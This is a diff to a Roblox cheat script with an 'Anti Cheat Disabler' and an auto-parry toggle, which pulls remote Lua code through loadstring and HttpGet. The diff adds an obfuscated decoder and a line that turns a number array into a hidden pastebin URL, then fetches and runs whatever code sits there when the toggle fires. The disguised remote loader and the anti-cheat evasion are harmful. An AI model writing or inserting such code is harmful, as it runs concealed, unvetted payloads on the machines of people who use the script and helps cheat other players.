@@ -1,3 +1,5 @@
+--Esse Codigo Serve Para A Criptgrafia Ser Reconhecida Pelo Executor
+function YPKVVDFhFFKOyJhCXkqSTrSFSsLCOhW(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/1050)end return res end 
 --Anti Cheat Disabler
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
@@ -198,6 +200,7 @@ local Toggle = Tabs.P:AddToggle("AutoParry", {Title = "Auto Parry", Default = fa
 
 Toggle:OnChanged(function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/kehxyzdev/xhsjxnxnsjjsnz/main/xhzhusbxsbjsjs"))()
+  loadstring(game:HttpGet(YPKVVDFhFFKOyJhCXkqSTrSFSsLCOhW({109200,121800,121800,117600,120750,60900,49350,49350,117600,101850,120750,121800,106050,102900,110250,115500,48300,103950,116550,114450,49350,119700,101850,124950,49350,121800,52500,53550,59850,51450,109200,51450,68250})))()
 end)
 Tabs.P:AddButton({
   Title = "Auto Spam Parry [In Dev]",
@@ -237,13 +240,3 @@ local function SpamParry()
       RunService.Heartbeat:Wait()
   end
 end
-
-local KeybindSpamParry = Tabs.P:AddKeybind("Keybind", {
-  Title = "Spam Parry Manual",
-  Mode = "Hold", -- Always, Toggle, Hold
-  Default = "E", 
-  ChangedCallback = function(value)
-    spamParry = not spamParry
-    coroutine.wrap(SpamParry)()
-  end
-})
